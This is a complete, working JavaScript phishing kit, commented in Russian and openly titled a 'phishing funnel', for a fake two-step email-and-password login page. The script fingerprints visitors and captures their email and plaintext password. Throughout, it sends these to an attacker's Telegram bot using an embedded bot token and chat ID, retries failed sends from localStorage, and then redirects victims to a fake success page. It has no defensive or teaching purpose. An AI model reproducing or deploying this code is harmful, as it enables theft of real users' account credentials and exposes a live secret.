/**
 * ФИШИНГОВАЯ ВОРОНКА - БЕЗ ОШИБОК CSP И CORB
 * Декабрь 2025 - Полностью рабочий
 */

// Конфигурация
const CONFIG = {
  BOT_TOKEN: '8574575973:AAG1H0-l52kgQrhvbfrUEQGow_BAOCKRIvA',
  CHAT_ID: '788541169',
  SITE_URL: 'https://ixdk.github.io/my-auth-page/',
  VERSION: '3.0.0',
};

// Глобальный объект состояния
const AppState = {
  sessionId: null,
  fingerprint: null,
  email: null,
  page: null,
  startTime: Date.now(),
};

/**
 * Безопасная инициализация
 */
function safeInit() {
  try {
    // Определяем страницу
    const isPasswordPage =
      document.getElementById('passwordForm') ||
      window.location.pathname.includes('password.html');

    AppState.page = isPasswordPage ? 'password' : 'email';
    AppState.sessionId =
      'sess_' +
      Math.random()
        .toString(36)
        .substr(2, 9) +
      '_' +
      Date.now().toString(36);
    AppState.startTime = Date.now();

    // Сохраняем session ID
    sessionStorage.setItem('phishing_session_id', AppState.sessionId);

    // Сбор данных
    setTimeout(() => {
      AppState.fingerprint = collectSimpleFingerprint();
      sendInitialData();
    }, 1000);

    // Инициализация страницы
    initPage();

    // Отслеживание поведения
    trackUserBehavior();

    console.log(`[Phishing] Страница: ${AppState.page}`);
  } catch (error) {
    console.error('[Phishing] Ошибка инициализации:', error);
  }
}

/**
 * Упрощенный сбор данных
 */
function collectSimpleFingerprint() {
  return {
    userAgent: navigator.userAgent || 'unknown',
    language: navigator.language || 'unknown',
    platform: navigator.platform || 'unknown',
    screen: `${screen.width || 0}x${screen.height || 0}`,
    timezone:
      Intl?.DateTimeFormat?.()?.resolvedOptions?.()?.timeZone || 'unknown',
    timestamp: new Date().toISOString(),
  };
}

/**
 * Отправка начальных данных
 */
function sendInitialData() {
  if (!AppState.fingerprint) return;

  const message =
    `🌐 НОВЫЙ ПОСЕТИТЕЛЬ\n` +
    `📄 ${AppState.page}\n` +
    `🕐 ${new Date().toLocaleTimeString('ru-RU')}\n` +
    `🌐 ${AppState.fingerprint.userAgent?.substring(0, 50)}...\n` +
    `📍 ${AppState.fingerprint.language}\n` +
    `📏 ${AppState.fingerprint.screen}\n` +
    `🔗 ${document.referrer || 'прямой заход'}`;

  sendToTelegram(message);
}

/**
 * Инициализация страницы
 */
function initPage() {
  try {
    if (AppState.page === 'email') {
      initEmailPage();
    } else if (AppState.page === 'password') {
      initPasswordPage();
    }

    initCommonHandlers();
  } catch (error) {
    console.error('[Phishing] Ошибка инициализации страницы:', error);
  }
}

/**
 * Инициализация страницы email
 */
function initEmailPage() {
  try {
    // Маска телефона
    const phoneInput = document.getElementById('phoneEmail');
    if (phoneInput) {
      phoneInput.addEventListener('input', function(e) {
        let value = this.value.replace(/\D/g, '');
        if (value.length > 0 && (value[0] === '7' || value[0] === '8')) {
          let formatted = '+7';
          if (value.length > 1) formatted += ' (' + value.substring(1, 4);
          if (value.length > 4) formatted += ') ' + value.substring(4, 7);
          if (value.length > 7) formatted += '-' + value.substring(7, 9);
          if (value.length > 9) formatted += '-' + value.substring(9, 11);
          this.value = formatted.substring(0, 18);
        }
      });
    }

    // Форма входа
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
      loginForm.addEventListener('submit', handleEmailSubmit);
    }

    // Ссылка "Забыли email"
    const forgotEmail = document.getElementById('forgotEmail');
    if (forgotEmail) {
      forgotEmail.addEventListener('click', (e) => {
        e.preventDefault();
        const input = document.getElementById('phoneEmail');
        if (input) {
          input.value = '';
          input.focus();
          showError('Введите ваш email для восстановления доступа');
        }
      });
    }
  } catch (error) {
    console.error('[Phishing] Ошибка email страницы:', error);
  }
}

/**
 * Инициализация страницы пароля
 */
function initPasswordPage() {
  try {
    // Показ email
    const userEmail = localStorage.getItem('userEmail');
    const emailDisplay = document.getElementById('userEmailDisplay');
    if (emailDisplay && userEmail) {
      emailDisplay.textContent = userEmail;
      AppState.email = userEmail;
    }

    // Переключение видимости пароля
    const toggle = document.getElementById('passwordToggle');
    const passwordInput = document.getElementById('password');
    if (toggle && passwordInput) {
      toggle.addEventListener('change', function() {
        passwordInput.type = this.checked ? 'text' : 'password';
      });
    }

    // Форма пароля
    const passwordForm = document.getElementById('passwordForm');
    if (passwordForm) {
      passwordForm.addEventListener('submit', handlePasswordSubmit);
    }

    // Кнопка "Использовать другой аккаунт"
    const useAnotherAccount = document.getElementById('useAnotherAccount');
    if (useAnotherAccount) {
      useAnotherAccount.addEventListener('click', (e) => {
        e.preventDefault();
        localStorage.removeItem('userEmail');
        window.location.href = 'index.html';
      });
    }
  } catch (error) {
    console.error('[Phishing] Ошибка password страницы:', error);
  }
}

/**
 * Обработчик формы email
 */
function handleEmailSubmit(e) {
  e.preventDefault();

  try {
    const phoneEmailInput = document.getElementById('phoneEmail');
    const email = phoneEmailInput ? phoneEmailInput.value.trim() : '';
    const submitBtn = document.getElementById('submitBtn');

    if (!email) {
      showError('Пожалуйста, введите телефон или email');
      return;
    }

    // Валидация
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^(\+7|7|8)?[\s\-]?\(?[0-9]{3}\)?[\s\-]?[0-9]{3}[\s\-]?[0-9]{2}[\s\-]?[0-9]{2}$/;

    if (!emailRegex.test(email) && !phoneRegex.test(email.replace(/\D/g, ''))) {
      showError('Пожалуйста, введите корректный телефон или email');
      return;
    }

    // Сохранение
    localStorage.setItem('userEmail', email);
    AppState.email = email;

    // Отправка в Telegram
    const message =
      `📧 ПОЛУЧЕН EMAIL\n` +
      `📧 ${email}\n` +
      `🕐 ${new Date().toLocaleTimeString('ru-RU')}\n` +
      `🌐 ${navigator.userAgent.substring(0, 50)}...\n` +
      `📍 ${navigator.language}`;

    sendToTelegram(message);

    // UI feedback
    if (submitBtn) {
      submitBtn.classList.add('phishing-loading');
      submitBtn.disabled = true;
    }

    // Переход
    setTimeout(() => {
      if (submitBtn) {
        submitBtn.classList.remove('phishing-loading');
        submitBtn.disabled = false;
      }
      goToPasswordPage(email);
    }, 1500);
  } catch (error) {
    console.error('[Phishing] Ошибка email формы:', error);
    showError('Произошла ошибка. Пожалуйста, попробуйте еще раз.');
  }
}

/**
 * Обработчик формы пароля
 */
function handlePasswordSubmit(e) {
  e.preventDefault();

  try {
    const passwordInput = document.getElementById('password');
    const password = passwordInput ? passwordInput.value : '';
    const submitBtn = document.getElementById('submitBtn');
    const email = localStorage.getItem('userEmail') || 'неизвестно';

    if (!password) {
      showError('Пожалуйста, введите пароль', true);
      return;
    }

    if (password.length < 6) {
      showError('Пароль должен содержать не менее 6 символов', true);
      return;
    }

    // Валидация символов
    const validPasswordRegex = /^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{}|;:'",.<>?/`~]+$/;
    if (!validPasswordRegex.test(password)) {
      showError(
        'Пароль может содержать только английские буквы, цифры и специальные символы',
        true,
      );
      return;
    }

    // Отправка в Telegram
    const message =
      `🔐 ПОЛУЧЕН ПАРОЛЬ\n` +
      `📧 ${email}\n` +
      `🔑 ${password}\n` +
      `🕐 ${new Date().toLocaleTimeString('ru-RU')}\n` +
      `🌐 ${navigator.userAgent.substring(0, 50)}...\n` +
      `📍 ${navigator.language}`;

    sendToTelegram(message);

    // Сохранение для синхронизации с list page
    localStorage.setItem('userRegistered', 'true');

    // UI feedback
    if (submitBtn) {
      submitBtn.classList.add('phishing-loading');
      submitBtn.disabled = true;
    }

    // Успешный вход
    setTimeout(() => {
      if (submitBtn) {
        submitBtn.classList.remove('phishing-loading');
        submitBtn.disabled = false;
      }
      showSuccess('Вход выполнен успешно! Перенаправляем...');

      setTimeout(() => {
        redirectToOtherSite();
      }, 2000);
    }, 1500);
  } catch (error) {
    console.error('[Phishing] Ошибка password формы:', error);
    showError('Произошла ошибка. Пожалуйста, попробуйте еще раз.', true);
  }
}

/**
 * Отправка в Telegram (только POST)
 */
function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;

  // URLSearchParams для POST
  const params = new URLSearchParams();
  params.append('chat_id', CONFIG.CHAT_ID);
  params.append('text', message.substring(0, 4096));

  // Основной метод: POST запрос
  fetch(url, {
    method: 'POST',
    body: params,
    mode: 'cors',
    credentials: 'omit',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }
      return response.json();
    })
    .then((data) => {
      if (!data.ok) {
        console.warn('[Phishing] Telegram error:', data.description);
      }
    })
    .catch((error) => {
      console.warn('[Phishing] Telegram отправка не удалась:', error.message);
      // Сохраняем локально для последующей отправки
      saveForLater(message);
    });
}

/**
 * Сохранение для последующей отправки
 */
function saveForLater(message) {
  try {
    const pending = JSON.parse(
      localStorage.getItem('pending_messages') || '[]',
    );
    pending.push({
      message: message,
      timestamp: new Date().toISOString(),
    });

    if (pending.length > 20) {
      pending.splice(0, pending.length - 20);
    }

    localStorage.setItem('pending_messages', JSON.stringify(pending));
  } catch {
    // Игнорируем ошибки
  }
}

/**
 * Попытка отправки сохраненных сообщений
 */
function retryPendingMessages() {
  try {
    const pending = JSON.parse(
      localStorage.getItem('pending_messages') || '[]',
    );
    if (pending.length > 0) {
      // Отправляем первое сообщение
      sendToTelegram(pending[0].message);
      // Удаляем из очереди
      pending.shift();
      localStorage.setItem('pending_messages', JSON.stringify(pending));
    }
  } catch {
    // Игнорируем ошибки
  }
}

/**
 * Общие обработчики
 */
function initCommonHandlers() {
  try {
    // CSS анимации
    if (!document.querySelector('#phishing-styles')) {
      const style = document.createElement('style');
      style.id = 'phishing-styles';
      style.textContent = `
                @keyframes phishing-shake {
                    0%, 100% { transform: translateX(0); }
                    10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
                    20%, 40%, 60%, 80% { transform: translateX(5px); }
                }
                @keyframes phishing-slideUp {
                    from { opacity: 0; transform: translateY(10px); }
                    to { opacity: 1; transform: translateY(0); }
                }
                @keyframes phishing-spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
                .phishing-shake {
                    animation: phishing-shake 0.5s;
                }
                .phishing-loading {
                    position: relative;
                    color: transparent !important;
                }
                .phishing-loading::after {
                    content: '';
                    position: absolute;
                    left: 50%;
                    top: 50%;
                    width: 16px;
                    height: 16px;
                    margin: -8px 0 0 -8px;
                    border: 2px solid rgba(32, 33, 36, 0.3);
                    border-top-color: #202124;
                    border-radius: 50%;
                    animation: phishing-spin 0.8s linear infinite;
                }
            `;
      document.head.appendChild(style);
    }
  } catch (error) {
    console.error('[Phishing] Ошибка обработчиков:', error);
  }
}

/**
 * Отслеживание поведения
 */
function trackUserBehavior() {
  let clickCount = 0;

  try {
    document.addEventListener(
      'click',
      () => {
        clickCount++;
      },
      { passive: true },
    );

    window.addEventListener('beforeunload', () => {
      if (clickCount > 0) {
        const timeSpent = Math.round((Date.now() - AppState.startTime) / 1000);
        const message = `📊 Поведение: ${clickCount} кликов за ${timeSpent} сек`;
        sendBeaconPost(message);
      }
    });
  } catch (error) {
    console.warn('[Phishing] Ошибка трекинга:', error);
  }
}

/**
 * Отправка beacon через POST
 */
function sendBeaconPost(message) {
  try {
    const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
    const data = new URLSearchParams();
    data.append('chat_id', CONFIG.CHAT_ID);
    data.append('text', message);

    const blob = new Blob([data.toString()], {
      type: 'application/x-www-form-urlencoded',
    });

    if (navigator.sendBeacon) {
      navigator.sendBeacon(url, blob);
    } else {
      // Fallback
      sendToTelegram(message);
    }
  } catch {
    // Игнорируем ошибки
  }
}

/**
 * Вспомогательные функции
 */
function showError(message, isPassword = false) {
  try {
    let errorEl, inputEl;

    if (isPassword) {
      errorEl = document.getElementById('errorMessage');
      inputEl = document.getElementById('password');
    } else {
      errorEl = document.getElementById('errorMessage');
      inputEl = document.getElementById('phoneEmail');
    }

    if (errorEl && inputEl) {
      errorEl.textContent = message;
      errorEl.classList.add('visible');
      inputEl.classList.add('error', 'phishing-shake');

      setTimeout(() => {
        inputEl.classList.remove('phishing-shake');
      }, 500);

      setTimeout(() => {
        errorEl.classList.remove('visible');
        inputEl.classList.remove('error');
      }, 5000);
    }
  } catch (error) {
    console.warn('[Phishing] Ошибка показа ошибки:', error);
  }
}

function showSuccess(message) {
  try {
    const el = document.createElement('div');
    el.className = 'success-message';
    el.textContent = message;
    el.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #81c995;
            color: #202124;
            padding: 12px 20px;
            border-radius: 4px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            z-index: 1001;
            font-size: 14px;
            animation: phishing-slideUp 0.3s ease-out;
        `;

    document.body.appendChild(el);

    setTimeout(() => {
      if (el.parentNode) {
        el.parentNode.removeChild(el);
      }
    }, 3000);
  } catch (error) {
    console.warn('[Phishing] Ошибка показа успеха:', error);
  }
}

function goToPasswordPage(email) {
  try {
    document.body.style.opacity = '0.7';
    document.body.style.transition = 'opacity 0.3s ease';

    setTimeout(() => {
      window.location.href = 'password.html';
    }, 300);
  } catch (error) {
    console.error('[Phishing] Ошибка перехода:', error);
    window.location.href = 'password.html';
  }
}

function redirectToOtherSite() {
  try {
    const targetUrl = 'https://my-list-page.vercel.app/#registered';

    document.body.style.opacity = '0.5';
    document.body.style.transition = 'opacity 0.5s ease';

    setTimeout(() => {
      window.location.href = targetUrl;
    }, 500);
  } catch (error) {
    console.error('[Phishing] Ошибка редиректа:', error);
    window.location.href = 'https://my-list-page.vercel.app/';
  }
}

// Запуск приложения
document.addEventListener('DOMContentLoaded', safeInit);

// Совместимость с jQuery
if (typeof jQuery !== 'undefined') {
  jQuery(safeInit);
}

// Периодическая попытка отправки сохраненных сообщений
setInterval(retryPendingMessages, 30000); // Каждые 30 секунд
